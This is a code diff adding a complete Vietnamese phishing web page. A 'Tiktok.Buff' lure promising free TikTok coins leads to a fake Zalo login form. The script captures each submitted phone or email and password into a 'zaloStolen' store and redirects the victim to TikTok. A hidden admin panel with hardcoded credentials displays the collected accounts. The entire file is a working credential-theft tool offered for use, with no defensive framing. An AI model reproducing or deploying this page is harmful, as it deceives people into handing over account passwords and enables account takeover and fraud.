@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiktok.Buff - Kiếm Xu TikTok</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        
+        body { min-height: 100vh; display: flex; justify-content: center; align-items: center; background: #f0f2f5; }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container { 
+            display: none; 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 20px; 
+        }
+        .container.active { display: block; }
+
+        /* ===== TIKTOK.BUFF PAGE ===== */
+        .tiktok-page { text-align: center; }
+        .tiktok-page h1 { font-size: 36px; font-weight: 800; color: #1a1a2e; margin-bottom: 8px; }
+        .tiktok-page h1 span { color: #ff0050; }
+        .tiktok-page .sub { color: #666; margin-bottom: 30px; font-size: 14px; }
+        .tiktok-page .btn-group { display: flex; flex-direction: column; gap: 14px; }
+        .tiktok-page .btn {
+            padding: 14px 0; border-radius: 8px; font-size: 16px; font-weight: 600;
+            cursor: pointer; border: none; transition: 0.2s;
+        }
+        .btn-login { background: #1a1a2e; color: #fff; }
+        .btn-login:hover { background: #2d2d4a; }
+        .btn-register { background: #ff0050; color: #fff; }
+        .btn-register:hover { background: #cc0040; }
+
+        /* ===== REGISTER PAGE ===== */
+        .register-page { text-align: center; }
+        .register-page h2 { font-size: 26px; color: #1a1a2e; margin-bottom: 10px; }
+        .register-page .sub { color: #666; margin-bottom: 30px; font-size: 14px; }
+        .zalo-join-btn {
+            display: inline-flex; align-items: center; gap: 10px;
+            background: #0068ff; color: #fff; padding: 14px 36px; border-radius: 8px;
+            font-size: 16px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s;
+        }
+        .zalo-join-btn:hover { background: #0052cc; }
+        .zalo-join-btn svg { width: 22px; height: 22px; fill: #fff; }
+        .back-link { display: block; margin-top: 20px; color: #888; font-size: 13px; cursor: pointer; }
+
+        /* ===== ZALO FAKE PAGE ===== */
+        .zalo-page {
+            background: #fff; border-radius: 12px; overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15); width: 100%;
+        }
+        .zalo-header {
+            background: linear-gradient(135deg, #0068ff, #0045b3);
+            color: #fff; padding: 24px 20px 18px; text-align: center;
+        }
+        .zalo-header .logo { font-size: 28px; font-weight: 700; letter-spacing: 1px; margin-bottom: 4px; }
+        .zalo-header .logo span { color: #8fc9ff; }
+        .zalo-header p { font-size: 13px; opacity: 0.85; }
+        .zalo-body { padding: 24px 20px 20px; }
+        .zalo-body .input-group { margin-bottom: 16px; }
+        .zalo-body .input-group label {
+            display: block; font-size: 13px; color: #333; font-weight: 500; margin-bottom: 6px;
+        }
+        .zalo-body .input-group input {
+            width: 100%; padding: 12px 14px; border: 1.5px solid #e0e0e0; border-radius: 6px;
+            font-size: 15px; outline: none; transition: 0.2s;
+        }
+        .zalo-body .input-group input:focus { border-color: #0068ff; }
+        .zalo-login-btn {
+            width: 100%; padding: 12px 0; background: #0068ff; color: #fff;
+            border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 6px; transition: 0.2s;
+        }
+        .zalo-login-btn:hover { background: #0052cc; }
+        .zalo-footer { text-align: center; padding: 0 20px 20px; font-size: 12px; color: #999; }
+        .zalo-error { 
+            color: #e74c3c; font-size: 13px; text-align: center; margin-bottom: 10px; display: none;
+        }
+        .zalo-success {
+            color: #27ae60; font-size: 13px; text-align: center; margin-bottom: 10px; display: none;
+        }
+
+        /* ===== ADMIN LOGIN (small, below) ===== */
+        .admin-mini { margin-top: 18px; text-align: center; }
+        .admin-mini .toggle-admin {
+            font-size: 12px; color: #bbb; cursor: pointer; transition: 0.2s;
+        }
+        .admin-mini .toggle-admin:hover { color: #888; }
+        .admin-mini .admin-box {
+            display: none; margin-top: 10px; padding: 12px; background: #fafafa;
+            border-radius: 8px; border: 1px solid #eee;
+        }
+        .admin-mini .admin-box input {
+            width: 100%; padding: 8px 10px; margin-bottom: 8px;
+            border: 1px solid #ddd; border-radius: 4px; font-size: 13px; outline: none;
+        }
+        .admin-mini .admin-box input:focus { border-color: #1a1a2e; }
+        .admin-mini .admin-box .admin-submit {
+            padding: 8px 20px; background: #1a1a2e; color: #fff;
+            border: none; border-radius: 4px; font-size: 13px; cursor: pointer; width: 100%;
+        }
+        .admin-mini .admin-box .admin-submit:hover { background: #333; }
+
+        /* ===== ADMIN DASHBOARD ===== */
+        .dashboard {
+            display: none; width: 100%; max-width: 600px; padding: 20px;
+        }
+        .dashboard.active { display: block; }
+        .dashboard h2 { color: #1a1a2e; margin-bottom: 6px; }
+        .dashboard .badge { 
+            background: #ff0050; color: #fff; font-size: 12px; padding: 2px 10px;
+            border-radius: 20px; display: inline-block; margin-bottom: 20px;
+        }
+        .dashboard table {
+            width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+        .dashboard th {
+            background: #1a1a2e; color: #fff; padding: 12px 14px; text-align: left; font-size: 14px;
+        }
+        .dashboard td {
+            padding: 10px 14px; border-bottom: 1px solid #f0f0f0; font-size: 14px; color: #333;
+        }
+        .dashboard tr:last-child td { border-bottom: none; }
+        .dashboard .no-data { text-align: center; padding: 30px; color: #999; font-size: 14px; }
+        .dashboard .logout-btn {
+            margin-top: 16px; padding: 10px 24px; background: #e74c3c; color: #fff;
+            border: none; border-radius: 6px; font-size: 14px; cursor: pointer;
+        }
+        .dashboard .logout-btn:hover { background: #c0392b; }
+        .dashboard .total { margin-top: 14px; font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+<!-- ==================== TIKTOK.BUFF ==================== -->
+<div id="tiktokPage" class="container active">
+    <div class="tiktok-page">
+        <h1>Tiktok.<span>Buff</span></h1>
+        <p class="sub">Tăng tương tác TikTok • Buff follow, tim, view</p>
+        <div class="btn-group">
+            <button class="btn btn-login" onclick="showPage('zaloPage')">Đăng nhập</button>
+            <button class="btn btn-register" onclick="showPage('registerPage')">Đăng kí</button>
+        </div>
+    </div>
+</div>
+
+<!-- ==================== REGISTER PAGE ==================== -->
+<div id="registerPage" class="container">
+    <div class="register-page">
+        <h2>Đăng kí tài khoản</h2>
+        <p class="sub">Nhận 10.000 xu miễn phí khi tham gia nhóm Zalo</p>
+        <button class="zalo-join-btn" onclick="showPage('zaloPage')">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-4-4 1.41-1.41L11 14.17l6.59-6.59L19 9l-8 8z"/></svg>
+            Tham gia nhóm Zalo để nhận xu
+        </button>
+        <span class="back-link" onclick="showPage('tiktokPage')">← Quay lại</span>
+    </div>
+</div>
+
+<!-- ==================== ZALO FAKE PAGE ==================== -->
+<div id="zaloPage" class="container">
+    <div class="zalo-page">
+        <div class="zalo-header">
+            <div class="logo">Zalo <span>Buff</span></div>
+            <p>Đăng nhập tài khoản Zalo để nhận xu TikTok</p>
+        </div>
+        <div class="zalo-body">
+            <div class="zalo-error" id="zaloError">Sai tài khoản hoặc mật khẩu!</div>
+            <div class="zalo-success" id="zaloSuccess"></div>
+            <div class="input-group">
+                <label>Số điện thoại / Email</label>
+                <input type="text" id="zaloUser" placeholder="Nhập số điện thoại hoặc email">
+            </div>
+            <div class="input-group">
+                <label>Mật khẩu</label>
+                <input type="password" id="zaloPass" placeholder="Nhập mật khẩu">
+            </div>
+            <button class="zalo-login-btn" onclick="zaloLogin()">Đăng nhập</button>
+        </div>
+        <div class="zalo-footer">
+            Bằng cách đăng nhập, bạn đồng ý với Điều khoản & Điều kiện
+        </div>
+    </div>
+
+    <!-- ===== ADMIN MINI ===== -->
+    <div class="admin-mini">
+        <span class="toggle-admin" onclick="toggleAdmin()">🔑 Admin</span>
+        <div class="admin-box" id="adminBox">
+            <input type="text" id="adminUser" placeholder="Tài khoản admin">
+            <input type="password" id="adminPass" placeholder="Mật khẩu admin">
+            <button class="admin-submit" onclick="adminLogin()">Đăng nhập Admin</button>
+        </div>
+    </div>
+</div>
+
+<!-- ==================== ADMIN DASHBOARD ==================== -->
+<div id="dashboard" class="dashboard">
+    <h2>🛡️ Admin Panel</h2>
+    <span class="badge">Tài khoản đã thu thập</span>
+    <table>
+        <thead>
+            <tr><th>#</th><th>Số điện thoại / Email</th><th>Mật khẩu</th><th>Thời gian</th></tr>
+        </thead>
+        <tbody id="dataTable">
+            <tr><td colspan="4" class="no-data">Chưa có dữ liệu</td></tr>
+        </tbody>
+    </table>
+    <p class="total" id="totalCount">Tổng: 0 tài khoản</p>
+    <button class="logout-btn" onclick="adminLogout()">Đăng xuất</button>
+</div>
+
+<script>
+    // ===== STORED CREDENTIALS =====
+    let stolenData = JSON.parse(localStorage.getItem('zaloStolen') || '[]');
+
+    function saveStolen() {
+        localStorage.setItem('zaloStolen', JSON.stringify(stolenData));
+    }
+
+    // ===== PAGE NAV =====
+    function showPage(id) {
+        document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.getElementById('dashboard').classList.remove('active');
+        // Reset Zalo messages
+        document.getElementById('zaloError').style.display = 'none';
+        document.getElementById('zaloSuccess').style.display = 'none';
+    }
+
+    // ===== ZALO FAKE LOGIN =====
+    function zaloLogin() {
+        const user = document.getElementById('zaloUser').value.trim();
+        const pass = document.getElementById('zaloPass').value.trim();
+        const errEl = document.getElementById('zaloError');
+        const sucEl = document.getElementById('zaloSuccess');
+
+        errEl.style.display = 'none';
+        sucEl.style.display = 'none';
+
+        if (!user || !pass) {
+            errEl.textContent = 'Vui lòng nhập đầy đủ thông tin!';
+            errEl.style.display = 'block';
+            return;
+        }
+
+        // Save stolen data
+        const now = new Date();
+        const timeStr = now.toLocaleString('vi-VN');
+        stolenData.push({ user, pass, time: timeStr });
+        saveStolen();
+
+        // Show success
+        sucEl.textContent = '✅ Đăng nhập thành công! Bạn sẽ được chuyển hướng...';
+        sucEl.style.display = 'block';
+
+        // Clear fields
+        document.getElementById('zaloUser').value = '';
+        document.getElementById('zaloPass').value = '';
+
+        // Redirect to TikTok after 1.5s
+        setTimeout(() => {
+            window.location.href = 'https://www.tiktok.com';
+        }, 1500);
+    }
+
+    // ===== ADMIN TOGGLE =====
+    function toggleAdmin() {
+        const box = document.getElementById('adminBox');
+        box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // ===== ADMIN LOGIN =====
+    function adminLogin() {
+        const u = document.getElementById('adminUser').value.trim();
+        const p = document.getElementById('adminPass').value.trim();
+        const errEl = document.getElementById('zaloError');
+
+        if (u === '980' && p === '123@') {
+            // Success
+            document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
+            document.getElementById('dashboard').classList.add('active');
+            renderDashboard();
+            // Clear admin fields
+            document.getElementById('adminUser').value = '';
+            document.getElementById('adminPass').value = '';
+            document.getElementById('adminBox').style.display = 'none';
+            errEl.style.display = 'none';
+        } else {
+            errEl.textContent = 'Sai tài khoản hoặc mật khẩu admin!';
+            errEl.style.display = 'block';
+        }
+    }
+
+    // ===== RENDER DASHBOARD =====
+    function renderDashboard() {
+        const tbody = document.getElementById('dataTable');
+        const total = document.getElementById('totalCount');
+        
+        if (stolenData.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="4" class="no-data">Chưa có dữ liệu</td></tr>';
+            total.textContent = 'Tổng: 0 tài khoản';
+            return;
+        }
+
+        let html = '';
+        stolenData.forEach((item, index) => {
+            html += `<tr>
+                <td>${index + 1}</td>
+                <td>${escapeHtml(item.user)}</td>
+                <td>${escapeHtml(item.pass)}</td>
+                <td>${escapeHtml(item.time)}</td>
+            </tr>`;
+        });
+        tbody.innerHTML = html;
+        total.textContent = `Tổng: ${stolenData.length} tài khoản`;
+    }
+
+    function escapeHtml(str) {
+        const div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    }
+
+    // ===== ADMIN LOGOUT =====
+    function adminLogout() {
+        document.getElementById('dashboard').classList.remove('active');
+        document.getElementById('tiktokPage').classList.add('active');
+    }
+
+    // Enter key support for Zalo login
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            const zaloPage = document.getElementById('zaloPage');
+            if (zaloPage.classList.contains('active')) {
+                // Check if admin box is open and focused
+                const adminBox = document.getElementById('adminBox');
+                if (adminBox.style.display === 'block' && 
+                    (document.activeElement === document.getElementById('adminUser') ||
+                     document.activeElement === document.getElementById('adminPass'))) {
+                    adminLogin();
+                } else {
+                    zaloLogin();
+                }
+            }
+        }
+    });
+</script>
+
+</body>
+</html>
